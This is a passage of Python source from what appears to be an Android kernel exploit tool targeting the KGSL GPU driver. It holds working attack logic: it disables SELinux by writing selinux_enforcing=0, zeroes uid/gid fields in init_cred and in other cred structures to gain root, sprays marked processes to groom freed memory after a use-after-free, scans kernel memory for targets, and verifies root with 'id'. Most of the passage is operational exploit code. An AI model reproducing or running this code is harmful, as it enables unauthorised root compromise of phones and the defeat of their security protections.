                    self.live["last_msg"] = f"AUTO: patching SELinux {sel_va:#x} -> 0…"
                    res = self.patch_mem(sel_va, 0)
                    self.log_event("auto_selinux_patch", {"va": hex(sel_va), "result": res})
                    self._add_found(
                        va=hex(sel_va),
                        type="SELinux (PATCHED)",
                        desc=f"selinux_enforcing=0 (was {val}, verified)",
                        confidence=100,
                    )
                else:
                    self.live["last_msg"] = "AUTO: SELinux NOT verified (no stable value at known offsets)"
                    self.log_event("auto_selinux_fail", {"kbase": hex(kbase)})

                self.live["last_msg"] = f"AUTO: locating init_cred @ 0x{self.init_cred_offset:x}…"
                ic = self._find_init_cred(kbase)
                if ic is not None:
                    self.cred_va = ic
                    cred_verify = self._verify_init_cred(ic)
                    self.log_event("auto_init_cred", {"va": hex(ic), "verify": cred_verify})
                    self._add_found(
                        va=hex(ic),
                        type="Privilege Struct",
                        desc=f"init_cred (verified={cred_verify})",
                        confidence=100,
                    )
                    # Patch init_cred uid/gid/euid/egid to 0 (root)
                    for off in (4, 8, 12, 16, 20, 24):
                        self.patch_mem(ic + off, 0)
                    self._add_found(
                        va=hex(ic),
                        type="Privilege Struct (ROOTED)",
                        desc=f"init_cred uid/gid=0 (verified={cred_verify})",
                        confidence=100,
                    )
                else:
                    self.live["last_msg"] = "AUTO: init_cred NOT verified (no cred struct at known offsets)"
                    self.log_event("auto_init_cred_fail", {"kbase": hex(kbase)})

                sel_str = f"0x{sel[0]:x}" if sel else "N/A"
                ic_str  = f"0x{ic:x}" if ic else "N/A"
                self.live["last_msg"] = "AUTO: probing other kernel globals (selinux_enabled, kptr_restrict)…"
                extra = self._probe_interesting(kbase)
                for f in extra:
                    self._add_found(
                        va=hex(f["va"]),
                        type="Kernel Global",
                        desc=f"{f['name']}={f['val']} (nz={f['nonzero']})",
                        confidence=80,
                    )

                # 4. Walk cred chain from a known task_struct (if we found one)
                self.live["last_msg"] = "AUTO: walking cred chain from known task_structs…"
                walked = 0
                with self.bg_lock:
                    ts_items = [it for it in self.found_items
                                if it['type'] in ("Privilege Struct", "task_struct")
                                and 'task_struct' in it.get('description', '').lower()
                                and 'cred @' in it.get('description', '')]
                for it in ts_items[:3]:
                    try:
                        ts_va = int(it['va'], 16)
                    except Exception:
                        continue
                    # cred pointer is at offset 0x770 (or alt: 0x768, 0x778, 0x780)
                    for off in (0x770, 0x768, 0x778, 0x780):
                        chain = self.walk_cred_chain(ts_va, off_in_page=off, max_hops=3)
                        if not chain:
                            continue
                        for step_idx, (tgt, page, desc) in enumerate(chain):
                            walked += 1
                            self._add_found(
                                va=hex(tgt),
                                type="Privilege Struct",
                                desc=f"{desc} (hop {step_idx} from {hex(ts_va)}+0x{off:x})",
                                confidence=95 if "ROOT" in desc else 70,
                                data=page,
                            )
                            if "ROOT" in desc:
                                # Found init_cred-like via chain — patch uid/gid
                                self.cred_va = tgt
                                for f_off in (4, 8, 12, 16, 20, 24):
                                    self.patch_mem(tgt + f_off, 0)
                                self._add_found(
                                    va=hex(tgt),
                                    type="Privilege Struct (ROOTED)",
                                    desc="init_cred-like (from cred chain walk, patched)",
                                    confidence=100,
                                )
                                break
                        if self.cred_va:
                            break
                    if self.cred_va:
                        break
                self.live["last_msg"] = (
                    f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} "
                    f"cred={ic_str} extras={len(extra)}")
            except Exception as e:
                self.live["last_msg"] = f"Exploit error: {e}"
                self.log_event("exploit_error", {"err": str(e)})
            finally:
                self.op_busy["exploit"] = False

        threading.Thread(target=_worker, daemon=True).start()
        return "Exploit started"

    def cmd_clear(self):
        self.live["last_command"] = "C (Clear)"
        # Kill from all per-worker sets (not the global self.spray_procs
        # which is no longer the source of truth).
        killed = 0
        for wid, pids in list(self.spray_procs_by_worker.items()):
            for pid in list(pids):
                try:
                    os.kill(pid, 9)
                    os.waitpid(pid, 0)
                    killed += 1
                except Exception:
                    pass
            pids.clear()
        self.live["kill_count"] += killed
        self.live["last_msg"] = f"Memory Cleared ({killed} procs)."
        return "Cleared"

    def cmd_rebuild(self):
        self.live["last_command"] = "B (Rebuild)"
        ok = self.try_compile_engine()
        if ok and self.exploit_proc:
            try:
                self.exploit_proc.stdin.write(b"quit\n")
                self.exploit_proc.terminate()
            except Exception:
                pass
            self.exploit_proc = None
        self.live["last_msg"] = "Engine Rebuilt." if ok else "Rebuild Failed."
        return "Rebuilt" if ok else "Failed"

    def cmd_kgsl_retry(self):
        """v4.1: manually retry KGSL open. Useful when the
        initial open failed (e.g. transient SELinux / dac
        issue) and the user wants to retry without restarting
        the whole explorer. Also tries to drop into a more
        permissive SELinux context via runcon if available.
        """
        self.live["last_command"] = "KGSL Retry"
        self._kgsl_retries += 1
        # Close old fd if any
        if self.kgsl_fd is not None:
            try:
                os.close(self.kgsl_fd)
            except Exception:
                pass
        self.kgsl_fd = None
        # Try fresh open
        ok = self._kgsl_open()
        # Also restart engine
        if self.exploit_proc:
            try:
                self.exploit_proc.terminate()
            except Exception:
                pass
            self.exploit_proc = None
        self.ensure_engine()
        self.live["last_msg"] = (
            f"KGSL retry #{self._kgsl_retries}: "
            f"{'OK' if ok else 'FAIL'} "
            f"fd={self.kgsl_fd}")
        return "OK" if ok else "FAIL"

    def cmd_englog(self, n=40):
        """v4.1.13: dump engine stderr buffer. The engine
        writes critical diagnostic info on stderr like
        '[UAF] failed: ...', '[SCAN] total=...',
        'IOCTL_KGSL_DRAWCTXT_CREATE failed: ...'. These
        messages tell us WHY scan finds no matches or
        UAF fails. We capture them in a deque via a
        background thread; this command prints the
        last N lines (default 40) so the user can see
        what the engine has been doing.
        """
        self.live["last_command"] = "englog"
        if not hasattr(self, "_engine_stderr") or \
                self._engine_stderr is None:
            return "No engine stderr captured"
        buf = list(self._engine_stderr)[-int(n):]
        if not buf:
            return "Engine stderr buffer empty"
        out = "\n".join(buf)
        # Also write to /sdcard for offline review
        try:
            with open("/sdcard/kgsl_eng.log", "a") as f:
                f.write("\n--- englog dump ---\n")
                f.write(out + "\n")
        except Exception:
            pass
        return out

    def cmd_verify_root(self):
        self.live["last_command"] = "R (Verify Root)"
        try:
            res = subprocess.check_output(["id"], text=True).strip()
        except Exception:
            res = "id failed"
        self.live["last_msg"] = res
        return res

    def cmd_scan(self):
        """Synchronous scan, but with live progress bar updates."""
        self.live["last_command"] = "S (Scan)"
        if self.op_busy["scan"]:
            self.live["last_msg"] = "Scan already running…"
            return "Busy"
        if not self.ensure_engine():
            return "Engine Error"

        self.op_busy["scan"] = True
        # v4.1: smart scan range — if kbase known, target kernel
        # data section (kbase+0x1000000..+0x4000000) where
        # SELinux/init_cred/init_task live. Otherwise fall back
        # to KGSL UAF area.
        # v4.1: NEW "wide" mode — if kbase unknown AND we have
        # spray PIDs alive, scan the entire kernel slab range
        # (0xffffff8000000000..+0x40000000 = 1GB) for KETO
        # comms in normal task_structs. This is slow but finds
        # the spray WITHOUT needing a UAF. The comm is stored
        # at offset 0x718 in task_struct, so once we find a
        # KETO* comm we can read the whole task_struct and
        # walk cred.
        if self.kernel_base:
            scan_lo = self.kernel_base + 0x1000000
            scan_hi = self.kernel_base + 0x4000000
            self.live["last_msg"] = (
                f"SCANNING kdata 0x{scan_lo:x}..0x{scan_hi:x} (kbase known)")
        elif self.exploit_chain.get("uaf_triggered", False):
            # v4.1.12: UAF was triggered — scan the dangling
            # mapping directly. The UAF freed GPU page frames
            # are at 0x7001FF000 (UAF_START). After mmap_spray,
            # task_structs from our spray procs should land
            # in these pages. Scan this 64MB range (matches
            # v6.c SCAN_SIZE=0x04000000). This is the most
            # efficient scan — task_structs are 8KB and live
            # clustered, so 64MB = 8192 candidate task_struct
            # pages, plenty for our 20-100 spray procs.
            scan_lo = self.uaf_start
            scan_hi = self.uaf_start + 0x4000000  # 64MB
            self.live["last_msg"] = (
                f"SCANNING UAF 0x{scan_lo:x}..0x{scan_hi:x} "
                f"(UAF triggered, mmap_spray done)")
        else:
            # v4.1: check if we have live spray PIDs. If yes,
            # use WIDE mode (scans kernel slab). If no, fall
            # back to UAF area (but log that nothing will
            # be found without UAF trigger).
            total_alive = sum(
                len(s) for s in self.spray_procs_by_worker.values())
            if total_alive > 0:
                # Wide scan: 0xffffff8000000000..+0x40000000
                # This is the ARM64 kernel virtual space.
                # Will find task_structs allocated normally.
                scan_lo = 0xffffff8000000000
                scan_hi = 0xffffff8040000000  # 1GB
                self.live["last_msg"] = (
                    f"SCANNING WIDE 0x{scan_lo:x}..0x{scan_hi:x} "
                    f"({total_alive} sprays alive)")
            else:
                scan_lo = self.uaf_start
                scan_hi = self.uaf_start + self.scan_size
                self.live["last_msg"] = (
                    f"SCANNING uaf 0x{scan_lo:x}..0x{scan_hi:x} "
                    f"(kbase unknown, NO sprays alive)")
        self.live["scan_total"] = scan_hi - scan_lo
        self.live["scan_offset"] = 0

        def _scan_worker():
            try:
                # Prioritize known ranges (these are quick page reads)
                for va_hex in list(self.knowledge_base["successful_vas"])[:8]:
                    if self.cancel_flag.is_set():
                        return
                    va = int(va_hex, 16)
                    data = self.read_page(va)
                    if data and not any(int(it['va'], 16) == va for it in self.found_items):
                        with self.bg_lock:
                            self.found_items.append(self.classify_page(data, va))

                if not self._engine_write(
                    # v4.1: SMART scan range. If kernel_base was
                    # discovered via kallsyms or earlier leak, scan
                    # the kernel DATA section (kbase+0x1000000..
                    # kbase+0x4000000) where SELinux, init_cred,
                    # init_task live. Otherwise fall back to the
                    # KGSL UAF reclaim area at uaf_start.
                    # Without this, scans 100% miss the real
                    # kernel targets — they only look at GPU
                    # UAF reclaim region which is empty if the
                    # UAF wasn't triggered first.
                    f"scan {hex(scan_lo)} {hex(scan_hi)}\n".encode()):
                    self.live["last_msg"] = "Scan: engine write failed"
                    return

                # Use bounded readline timeouts so we never block forever
                deadline = time.time() + 600  # 10 min max
                while time.time() < deadline:
                    line = self._readline_timeout(timeout=1.0)
                    if line is None:
                        self.live["last_msg"] = "Scan: engine died"
                        return
                    if not line:
                        continue
                    if "SCAN_DONE" in line:
                        # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
                        try:
                            stats_part = line.split("SCAN_DONE", 1)[1]
                            kv = {}
                            for part in stats_part.split(":"):
                                if "=" in part:
                                    k, v = part.split("=", 1)
                                    kv[k] = v
                            reads   = int(kv.get("r", "0"))
                            failed  = int(kv.get("f", "0"))
                            empty   = int(kv.get("e", "0"))
                            nonzero = int(kv.get("n", "0"))
                            hits    = int(kv.get("h", "0"))
                            self.live["last_msg"] = (
                                f"S: SCAN_DONE read={reads} failed={failed} "
                                f"empty={empty} nonzero={nonzero} hits={hits}")
                        except Exception:
                            self.live["last_msg"] = "Scan complete."
                        break
                    if "PROGRESS:" in line:
                        try:
                            parts = line.split(":")
                            self.live["scan_offset"] = int(parts[1], 16)
                        except Exception:
                            pass
                        continue
                    if "MATCH:" in line:
                            try:
                                parts = line.split(":")
                                va = int(parts[1], 16)
                                sig = int(parts[2])
                                off_in_page = int(parts[3]) if len(parts) > 3 else -1
                            except Exception:
                                continue
                            self.live["scan_offset"] = va - self.uaf_start
                            data = self._read_data_packet()
                            if not data:
                                continue
                            if any(int(it['va'], 16) == va for it in self.found_items):
                                continue
                            # Smart multi-page read for strong sigs (now incl. 10, 11, 12)
                            cross = data
                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) and off_in_page >= 0:
                                triple = self.read_with_neighbors(va)
                                if triple and len(triple) == 12288:
                                    cross = triple
                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) or self._is_real_task_struct(cross):
                                with self.bg_lock:
                                    self.found_items.append(
                                        self.classify_page(cross, va, sig, off_in_page))
                                self.log_event("scan_match", {"va": va,
                                                               "type": self.found_items[-1]['type'],
                                                               "sig": sig})
                            else:
                                # Keep weaker matches as "Unknown Object"
                                interesting, reason, conf = self._is_page_interesting(data)
                                if interesting:
                                    with self.bg_lock:
                                        self.found_items.append({
                                            "type": "Unknown Object",
                                            "description": f"Auto-found ({reason})",
                                            "va": hex(va),
                                            "confidence": conf,
                                            "data": data,
                                            "ts": datetime.datetime.now().isoformat(),
                                        })
                                    self.log_event("scan_auto", {"va": va, "reason": reason,
                                                                  "conf": conf})

                self.live["scan_offset"] = self.scan_size
                self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
            except Exception as e:
                self.live["last_msg"] = f"Scan error: {e}"
                self.log_event("scan_error", {"err": str(e)})
            finally:
                self.op_busy["scan"] = False

        threading.Thread(target=_scan_worker, daemon=True).start()
        return "Scan started"

    # ============== BACKGROUND LEARNING (Ctrl+P to cancel) ==============
    def cmd_learning_start(self):
        """Launch AI learning in a background thread, controllable by Ctrl+P.
        Pressing L while learning is already running does nothing \u2014 only Ctrl+P cancels.

        Verticalization: launches LEARN_WORKERS subworkers in parallel, each
        with its own spray range + scan sub-range. This really loads the
        device (multiple spray processes, multiple engine ops) and finds
        offsets faster than a single sequential loop.
        """
        self.live["last_command"] = "L (Learning BG)"
        if self.bg_thread and self.bg_thread.is_alive():
            self.live["last_msg"] = "Learning already running \u2014 press Ctrl+P to cancel."
            return
        # Reset per-worker PID map BEFORE launching workers so stale
        # PIDs from a previous run don't linger in the new sets.
        self.spray_procs_by_worker = {}
        # Reset comm mismatch warning so first batch of new run
        # re-checks /proc/PID/comm.
        self._comm_warned = False
        # Reset xattr counter for new run
        self.learn_stats["xattrs_set"] = 0
        # Clear stale found_items from previous run. The user
        # was seeing 3 "Empty Page" entries that were discovered
        # 5 minutes ago and never went away — confusing because
        # they look like current results.
        self.found_items = []
        self.memory_map = []
        # Reset adaptive scan state
        self._adaptive_scan = {
            "no_match_batches": 0,
            "current_offset": 0,
            "ranges_tried": [],
        }
        self.cancel_flag.clear()
        self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
        self.bg_thread.start()
        self.live["last_msg"] = (
            f"Learning started ({LEARN_WORKERS} parallel workers, "
            f"batch=20, xattr={'ON' if self.use_xattr_spray else 'OFF (use xt to enable)'}). "
            f"Press Ctrl+P to cancel.")
        self.log_event("learning_start",
                       {"total_target": 1000, "batch": 35,
                        "workers": LEARN_WORKERS})
        return "BG started"

    def _learning_worker(self):
        """AI learning loop coordinator. Verticalized: launches
        LEARN_WORKERS _learning_subworker threads in parallel.

        Each subworker owns a slice of the spray range [0..target_total)
        and a slice of the scan range. They all serialize engine I/O
        through self.engine_lock, so they coexist safely with the
        autopilot and with each other.

        Real spray processes are forked independently per subworker, so
        the device's CPU + RAM + GPU pipeline really sees LEARN_WORKERSx
        the load (instead of artificially faking progress). This is the
        "verticalization" the user asked for.
        """
        target_total = 1000
        # Shared stats \u2014 incremented by all subworkers under stats_lock
        self.live["spray_target"] = target_total
        self.live["spray_count"] = 0
        self.live["kill_count"] = 0
        self.learn_stats = {
            "batches": 0, "matches": 0, "verified": 0,
            "false_positives": 0, "sprayed_total": 0,
            "xattrs_set": 0,
        }
        # Lock for shared stats \u2014 multiple subworkers bump these
        self.stats_lock = threading.Lock()

        # Launch LEARN_WORKERS subworkers in parallel
        self._learn_subworkers = []
        for wid in range(LEARN_WORKERS):
            slice_start = (target_total * wid) // LEARN_WORKERS
            slice_end   = (target_total * (wid + 1)) // LEARN_WORKERS
            t = threading.Thread(
                target=self._learning_subworker,
                args=(wid, slice_start, slice_end),
                daemon=True)
            t.start()
            self._learn_subworkers.append(t)
        # v4.1: smart kbase finder (one-shot, runs in background
        # so the scan workers can use it once it finds something)
        threading.Thread(target=self._bg_smart_kbase,
                         daemon=True).start()

        # Wait for all subworkers (or cancel)
        try:
            while not self.cancel_flag.is_set():
                alive = [t for t in self._learn_subworkers if t.is_alive()]
                if not alive:
                    break
                time.sleep(0.5)
                s = self.learn_stats
                self.live["last_msg"] = (
                    f"LEARN: {len(alive)}/{LEARN_WORKERS} workers | "
                    f"batches={s['batches']} | sprayed={s['sprayed_total']} | "
                    f"matches={s['matches']} | verified={s['verified']} | "
                    f"falsePos={s['false_positives']}")
        except Exception as e:
            self.log_event("learning_error", {"err": str(e)})

        # All subworkers done (or cancelled). Update final state.
        self.live["spray_target"] = 0
        s = self.learn_stats
        if self.cancel_flag.is_set():
            self.live["last_msg"] = (
                f"Learning cancelled. sprayed={s['sprayed_total']} "
                f"matches={s['matches']} verified={s['verified']} "
                f"falsePos={s['false_positives']}")
        else:
            self.live["last_msg"] = (
                f"Learning complete ({LEARN_WORKERS} workers). "
                f"sprayed={s['sprayed_total']} matches={s['matches']} "
                f"verified={s['verified']} falsePos={s['false_positives']}")
        # Persist learning stats
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   "learn_stats.json"), "w") as f:
                json.dump(s, f, indent=2)
        except Exception:
            pass
        self.log_event("learning_done", self.learn_stats)

    def _w3_worker(self):
        """W3 — dedicated deep-scan worker for Empty Page locations.

        Unlike the 3 spray workers (W0, W1, W2) which spray+scan
        their own slice, W3 ONLY scans. It re-reads the addresses
        of any item with type "Empty Page" or any other "boring"
        type to see if they change (spray might have landed later,
        or another worker might have written to that page).
        Updates the spray_map as it goes so the TUI shows the
        bucket as "scanning" (orange) or "found" (green).
        """
        import time as _t
        # v4.1: bind W3 to last CPU core for cache locality
        self._set_cpu_affinity(3)
        while not self.cancel_flag.is_set() and self.w3_enabled:
            if not self.ensure_engine():
                _t.sleep(1.0)
                continue
            # Pick up to 4 targets this iteration:
            # 1) All Empty Page items
            # 2) First 2 from found_items (in case new ones appeared)
            targets = []
            for it in list(self.found_items):
                if it.get("type") == "Empty Page":
                    try:
                        targets.append(int(it["va"], 16))
                    except Exception:
                        pass
            # Sort by VA for stable re-checks
            targets = sorted(set(targets))[:4]
            if not targets:
                # Nothing to deep-scan right now. Sleep and try
                # again in 5s.
                _t.sleep(5.0)
                continue
            for va in targets:
                if self.cancel_flag.is_set() or not self.w3_enabled:
                    break
                # Compute bucket index
                if (va >= self.uaf_start
                    and va < self.uaf_start + self.scan_size):
                    bidx = (va - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
                    if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                        with self.stats_lock:
                            self.spray_map[bidx] = 3  # scanning
                # Read 4 consecutive pages around this VA
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"W3: deep-scan 0x{va:x} (Empty Page recheck)")
                found_here = False
                for off in (0, 0x1000, -0x1000, 0x2000):
                    target_va = va + off
                    if (target_va < self.uaf_start
                        or target_va >= self.uaf_start + self.scan_size):
                        continue
                    if not self._engine_write(
                            f"read {hex(target_va)}\n".encode()):
                        continue
                    data = self._read_data_packet()
                    if not data or len(data) < 4096:
                        # Scan error
                        if (target_va >= self.uaf_start
                            and target_va < self.uaf_start + self.scan_size):
                            bidx = ((target_va - self.uaf_start)
                                    // self.SPRAY_MAP_BUCKET_SIZE)
                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                                with self.stats_lock:
                                    self.spray_map[bidx] = 4
                        continue
                    # Count non-zero bytes
                    nz = sum(1 for b in data if b)
                    if nz > 16:
                        # Non-trivial data — update bucket to FOUND
                        if (target_va >= self.uaf_start
                            and target_va < self.uaf_start + self.scan_size):
                            bidx = ((target_va - self.uaf_start)
                                    // self.SPRAY_MAP_BUCKET_SIZE)
                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                                with self.stats_lock:
                                    self.spray_map[bidx] = 6  # found!
                        # Try to classify it now (it might be a real
                        # object that we missed the first time)
                        classified = self.classify_page(
                            target_va, data, 17)  # sig=17 = comm-like
                        if classified and classified.get("type") != "Empty Page":
                            with self.bg_lock:
                                if not any(int(it['va'], 16) == target_va
                                           for it in self.found_items):
                                    self.found_items.append(classified)
                            with self.stats_lock:
                                self.learn_stats["matches"] += 1
                                # v4.1: confidence histogram
                                conf = classified.get("confidence", 0)
                                bidx = min(10, conf // 10)
                                self.conf_histogram[bidx] += 1
                            found_here = True
                            with self.stats_lock:
                                self.live["last_msg"] = (
                                    f"W3: FOUND 0x{target_va:x} = "
                                    f"{classified.get('type')} "
                                    f"({classified.get('description')})")
                            break
                    else:
                        # Still empty
                        if (target_va >= self.uaf_start
                            and target_va < self.uaf_start + self.scan_size):
                            bidx = ((target_va - self.uaf_start)
                                    // self.SPRAY_MAP_BUCKET_SIZE)
                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                                with self.stats_lock:
                                    self.spray_map[bidx] = 5  # done
                _t.sleep(0.5)  # be nice to the engine
            _t.sleep(2.0)

    def _bg_smart_kbase(self):
        """Background kbase search.

        Runs once when learning starts. Scans kernel text for
        ELF header, "Linux version" string, or commit_creds/
        prepare_kernel_cred symbol. Updates self.kernel_base
        and self.live["last_msg"] so the user sees the result.

        v4.1: tries kallsyms FIRST (fast, doesn't need engine),
        then falls back to ELF header scan via engine. This way
        the kbase is available even if the engine pipe is broken
        (Termux has no /dev/kgsl-3d0).
        """
        import time as _t
        # Wait briefly for engine
        for _ in range(20):
            if self._engine_alive() or self.ensure_engine():
                break
            _t.sleep(0.5)
        try:
            # First try kallsyms (fast, no engine required)
            n_syms = self.load_kallsyms()
            if n_syms > 0 and self.kernel_base:
                # kbase already set by load_kallsyms
                with self.stats_lock:
                    self.live["kernel_base"] = self.kernel_base
                return
            # Then try ELF header scan via engine
            kbase, conf = self._smart_kbase_finder()
            if kbase:
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"Smart kbase finder (ELF scan): 0x{kbase:x} "
                        f"(confidence={conf}%)")
                    self.live["kernel_base"] = kbase
        except Exception as e:
            with self.stats_lock:
                self.live["last_msg"] = f"Smart kbase finder failed: {e}"

    def cmd_w3_toggle(self):
        """Toggle the W3 deep-scan worker."""
        if self.w3_enabled:
            self.w3_enabled = False
            if self.w3_thread:
                self.w3_thread.join(timeout=2.0)
            self.live["last_msg"] = "W3 worker STOPPED"
        else:
            self.w3_enabled = True
            self.w3_thread = threading.Thread(
                target=self._w3_worker, daemon=True)
            self.w3_thread.start()
            self.live["last_msg"] = (
                "W3 worker STARTED (deep-scan Empty Pages)")

    def _learning_subworker(self, worker_id, slice_start, slice_end):
        """One parallel slice of the AI learning loop. Runs in its own thread.

        Owns spray indices [slice_start..slice_end) and a matching slice of
        the scan range. All engine I/O goes through self.engine_lock so we
        don't fight with the autopilot or with other subworkers.

        KEY: spray PIDs are stored in self.spray_procs_by_worker[worker_id],
        NOT in a global list. This is the fix for "1/3 workers" — previously
        one worker's RAM>70% cull wiped every other worker's spray set.
        """
        import subprocess as _sp
        # v4.1: bind each worker to its own CPU core for cache
        # locality. W0→CPU0, W1→CPU1, W2→CPU2, W3→CPU3.
        # On a 4-core device this prevents workers from
        # thrashing each other's L1/L2 cache.
        self._set_cpu_affinity(worker_id)
        # v4.1: mlockall so our Python process pages don't get
        # swapped. Without this, a long learning session can
        # have its own working set paged out, slowing
        # classification and engine pipe writes.
        self._mlock_current()
        # v4.1: adaptive batch — if we've gone N batches with 0
        # matches, shrink the batch so we don't waste RAM. The
        # idea: with 0 matches the spray isn't landing in our
        # scan range, so throwing 20 procs/batch at it is just
        # burning resources. Reduce to 8 and let the smaller
        # spray population exist longer (less churn).
        # v4.1: ALSO check kill rate. If >50% of spray procs
        # are being killed (OOM, seccomp, signal), we MUST
        # shrink the batch even at start. The 85% kill rate
        # the user was seeing in TUI means batch=20 was
        # spraying 20 procs that all died within seconds
        # — net result: 0 alive, 0 useful, RAM just churned.
        initial_kill_rate = (
            self.live.get("kill_count", 0) /
            max(1, self.live.get("spray_count", 0)))
        if initial_kill_rate > 0.5:
            # >50% killed previously → start tiny
            batch = 4
        elif initial_kill_rate > 0.3:
            # >30% killed → start small
            batch = 8
        else:
            batch = 20
        last_match_batches_ago = 0
        done = slice_start
        # Per-worker PID set — isolated from siblings.
        my_pids = set()
        self.spray_procs_by_worker[worker_id] = my_pids
        # Per-batch warning flag so we only complain about a comm
        # mismatch once per worker (not on every spray).
        self._comm_warned = False
        # Scan range for this subworker.
        # v4.1: SMART TARGETING — if kbase is known (from kallsyms
        # or from a successful UAF leak), scan the kernel data
        # section (kbase+0x1000000..kbase+0x4000000) where
        # SELinux, init_cred, init_task, and modprobe_path live.
        # The default uaf_start (0x7001FF000) is the KGSL UAF
        # reclaim area — useful only if we have an active UAF
        # reclaiming task_structs. Without a UAF, scanning that
        # range produces 0 matches every time. So we check kbase
        # first and target the right region.
        if self.kernel_base:
            # Kernel data section: 16MB wide, split across workers
            KB_DATA_OFFSET = 0x1000000
            KB_DATA_SIZE   = 0x3000000  # 48MB
            scan_chunk = (KB_DATA_SIZE) // LEARN_WORKERS
            scan_start = self.kernel_base + KB_DATA_OFFSET + scan_chunk * worker_id
            scan_end   = scan_start + scan_chunk
        else:
            # Fallback: KGSL UAF region (may be sparse)
            scan_chunk = (self.scan_size) // LEARN_WORKERS
            scan_start = self.uaf_start + scan_chunk * worker_id
            scan_end   = scan_start + scan_chunk

        while done < slice_end and not self.cancel_flag.is_set():
            # Respect RAM budget — only kill OUR spray procs, not siblings'.
            # v4.1: lower the threshold from 70% to 55% so we cull
            # BEFORE the OOM-killer decides to kill the Python process
            # itself. The previous 70% was too late — by then the system
            # had already started SIGKILL'ing random processes including
            # our spray procs (and sometimes the explorer itself). This
            # was visible as "kills:207(77%)" in the TUI.
            if self.get_ram_usage() > 55.0:
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"W{worker_id}: RAM>55%, killing {len(my_pids)} sprays\u2026")
                for pid in list(my_pids):
                    try:
                        # v4.1: try TERM first (graceful), then KILL.
                        # This lets the spray child write a clean exit
                        # log and frees slab pages faster than SIGKILL.
                        try:
                            os.kill(pid, 15)  # SIGTERM
                        except Exception:
                            pass
                        try:
                            os.waitpid(pid, 0)
                            with self.stats_lock:
                                self.live["kill_count"] += 1
                        except ChildProcessError:
                            # Already gone (e.g. OOM-killed it). Count
                            # it as a kill so the user sees the real
                            # death rate.
                            with self.stats_lock:
                                self.live["kill_count"] += 1
                                self.live["oom_kills"] = (
                                    self.live.get("oom_kills", 0) + 1)
                        except Exception:
                            # ESRCH = no such process. Don't double count.
                            pass
                    except Exception:
                        pass
                my_pids.clear()
                # v4.1: longer sleep so kernel can actually reclaim the
                # pages. 2s was too short on low-RAM devices.
                time.sleep(3)

            if not self.ensure_engine():
                time.sleep(1)
                continue

            # 1) SPRAY a batch (this subworker's slice) — v4.1 multi-method
            #
            # The spray loop now uses Q-learning to pick the BEST
            # combination of:
            #   - batch size
            #   - comm pattern (KETO / KETW / MIXED)
            #   - spray method (popen_sleep / mmap_anon / sendmsg)
            #   - scan range offset
            # based on past success rate. Each worker has its own
            # Q-table state so W0 might prefer mmap_anon while W1
            # prefers popen_sleep with KETO markers.
            #
            # Q-learning update happens AFTER the scan, so the loop
            # has time to see if the spray actually produced matches.
            state = (
                min(9, self._adaptive_scan.get("no_match_batches", 0)),
                int(self.live.get("kill_count", 0)
                    / max(1, self.live.get("spray_count", 0)) * 10),
            )
            action = self._q_choose_action(worker_id, state)
            self.q_last_state[worker_id] = state
            self.q_last_action[worker_id] = action
            # Apply Q-learning chosen parameters
            if action[0] == "batch":
                q_batch = action[1]
            else:
                q_batch = batch
            if action[0] == "comm":
                comm_pref = action[1]
            else:
                comm_pref = "MIXED"
            if action[0] == "range":
                q_range = action[1]
            else:
                q_range = worker_id

            batch_pids = []
            # v4.1.20: reaper — before spawning a new batch,
            # check if this worker has too many live procs.
            # If so, kill the oldest ones (those with
            # smallest PIDs, since spray always increments).
            # This prevents the cgroup OOM killer from
            # killing ALL our procs in one shot. The cgroup
            # limit on Termux is ~512MB; each proc ~6MB = max
            # ~85 procs across all 3 workers. We use 12 per
            # worker (36 total) which leaves plenty of
            # headroom for the engine, scans, and other
            # Python overhead.
            while len(my_pids) >= self.MAX_SPRAY_PER_WORKER:
                if not my_pids:
                    break
                oldest = min(my_pids)
                try:
                    os.kill(oldest, 9)
                except Exception:
                    pass
                my_pids.discard(oldest)
                with self.stats_lock:
                    self.live["kill_count"] = (
                        self.live.get("kill_count", 0) + 1)
            for i in range(q_batch):
                if self.cancel_flag.is_set():
                    break
                if self.get_ram_usage() > 60.0:
                    break
                idx = done + i
                if idx >= slice_end:
                    break
                try:
                    # v4.1: marker format from v6.c — "KETO0422" + 5
                    # digit PID. The C scan code does:
                    #   memcmp(page+off, "KETO0422", 8) == 0
                    #   AND 5 digits following (the actual PID)
                    #   AND pid > 1000
                    # We can't use the real PID at spray time
                    # (the child doesn't know its PID before
                    # prctl), so we use a numeric suffix and the
                    # child re-applies prctl with its REAL pid
                    # once it's running. The first 8 bytes
                    # ("KETO0422") must be a constant — that's
                    # what find_marker_in_page() looks for. The
                    # last 5 digits are the PID.
                    spray_idx = idx
                    if comm_pref == "KETO" or (
                            comm_pref == "MIXED" and spray_idx % 2 == 0):
                        # v6.c format: KETO0422 + 5 digit pid.
                        # We use the spray index as pid stand-in.
                        # The engine's find_marker_in_page will
                        # accept any pid 1000-99999, which our
                        # range 10000-99999 satisfies.
                        name = f"KETO0422{spray_idx % 100000:05d}"
                    elif comm_pref == "KETW":
                        # KETW + 5 digit pid (worker 0,1,2 + idx)
                        name = f"KETW0422{worker_id:01d}{spray_idx % 1000:04d}"
                    else:  # MIXED odd
                        name = f"KETW0422{worker_id:01d}{spray_idx % 1000:04d}"

                    # Pick spray method (rotate through working ones)
                    # v4.1: Use popen as primary (most reliable) and
                    # every 5th process use mmap_anon (if Q-learning
                    # says it's working).
                    p = None
                    if i % 5 == 0 and self.spray_methods_stats.get(
                            "mmap_anon", {}).get("matched", 0) > 0:
                        p_pid = self._spray_v4_mmap_anon(name, size_kb=64)
                        if p_pid:
                            class _FakePopen:
                                def __init__(self, pid):
                                    self.pid = pid
